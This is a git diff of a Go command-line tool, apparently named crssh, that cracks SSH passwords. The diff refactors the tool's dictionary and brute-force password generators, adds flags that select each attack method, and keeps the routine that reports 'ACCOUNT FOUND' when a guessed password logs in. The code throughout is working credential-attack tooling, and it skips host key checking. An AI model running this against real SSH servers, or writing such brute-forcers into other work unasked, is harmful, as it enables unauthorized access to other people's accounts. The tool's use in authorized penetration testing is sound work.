@@ -24,10 +24,12 @@ const (
 type passCracker = gobf.BruteForce
 
 var (
-	host string
-	user string
-	port uint
-	size uint
+	host              string
+	user              string
+	port              uint
+	size              uint
+	bfAttackEnabled   bool
+	dictAttackEnabled bool
 )
 
 var (
@@ -36,6 +38,8 @@ var (
 
 func init() {
 	rootCmd.Flags().StringVarP(&user, "user", "u", "root", "set user name")
+	rootCmd.Flags().BoolVarP(&bfAttackEnabled, "bruteforce", "b", false, "set brute force attack")
+	rootCmd.Flags().BoolVarP(&dictAttackEnabled, "dictionary", "d", false, "set dictionary attack")
 	rootCmd.Flags().UintVarP(&port, "port", "p", 22, "set port number")
 	rootCmd.Flags().UintVarP(&size, "size", "s", 4, "set password size for brute force attack")
 }
@@ -68,23 +72,9 @@ var rootCmd = &cobra.Command{
 		return nil
 	},
 	RunE: func(cmd *cobra.Command, _ []string) error {
-		crackerGens := []func() (passCracker, error){
-
-			// generator for dictionary attack.
-			func() (passCracker, error) {
-				return godict.New()
-			},
-
-			// generator for brute force attack.
-			func() (passCracker, error) {
-				return gobf.New(
-					gobf.WithUpper(true),
-					gobf.WithLower(true),
-					gobf.WithNumber(true),
-					gobf.WithSize(int(size)),
-					gobf.WithConcrencyLimit(100000),
-				)
-			},
+		crs, err := crackers()
+		if err != nil {
+			return err
 		}
 
 		ctx, cancel := context.WithCancel(cmd.Context())
@@ -94,14 +84,10 @@ var rootCmd = &cobra.Command{
 
 		eg, egctx := errgroup.WithContext(ctx)
 
-		for _, crackerGen := range crackerGens {
-			crackerGen := crackerGen
+		for _, cr := range crs {
+			cr := cr
 			eg.Go(func() error {
-				cracker, err := crackerGen()
-				if err != nil {
-					return err
-				}
-				return cracker.Do(egctx, func(pass string) {
+				return cr.Do(egctx, func(pass string) {
 					config := &ssh.ClientConfig{
 						User:            user,
 						HostKeyCallback: ssh.InsecureIgnoreHostKey(), // https://github.com/golang/go/issues/19767
@@ -142,7 +128,7 @@ var rootCmd = &cobra.Command{
 			})
 		}
 
-		err := eg.Wait()
+		err = eg.Wait()
 		if err != nil {
 			if errors.Is(err, context.Canceled) {
 				return nil
@@ -153,13 +139,31 @@ var rootCmd = &cobra.Command{
 	},
 }
 
-func printStats(pass string, err error) {
-	str := fmt.Sprintf("[crssh] Host: %s\tUser: %s\tPassword: %s", host, user, pass)
-	if err != nil {
-		fmt.Printf("\033[32mACCOUNT NOT FOUND: %s\tError: %s\n\033[39m", str, err.Error())
-	} else {
-		fmt.Printf("\033[31mACCOUNT FOUND: %s\n\033[39m", str)
+func crackers() (crs []passCracker, err error) {
+	crs = make([]passCracker, 0, 2)
+
+	if dictAttackEnabled {
+		c, err := godict.New()
+		if err != nil {
+			return nil, fmt.Errorf("failed to create dictionary attach method: %w", err)
+		}
+		crs = append(crs, c)
 	}
+
+	if bfAttackEnabled {
+		c, err := gobf.New(
+			gobf.WithUpper(true),
+			gobf.WithLower(true),
+			gobf.WithNumber(true),
+			gobf.WithSize(int(size)),
+			gobf.WithConcrencyLimit(100000),
+		)
+		if err != nil {
+			return nil, fmt.Errorf("failed to create brute force attach method: %w", err)
+		}
+		crs = append(crs, c)
+	}
+	return
 }
 
 // TODO: Add processing for ipv6.
@@ -190,6 +194,15 @@ func splitUserHostPort(str string) (host, user string, port uint, ipv4 bool, err
 	}
 
 	return
+}
+
+func printStats(pass string, err error) {
+	str := fmt.Sprintf("[crssh] Host: %s\tUser: %s\tPassword: %s", host, user, pass)
+	if err != nil {
+		fmt.Printf("\033[32mACCOUNT NOT FOUND: %s\tError: %s\n\033[39m", str, err.Error())
+	} else {
+		fmt.Printf("\033[31mACCOUNT FOUND: %s\n\033[39m", str)
+	}
 }
 
 // Execute adds all child commands to the root command and sets flags appropriately.
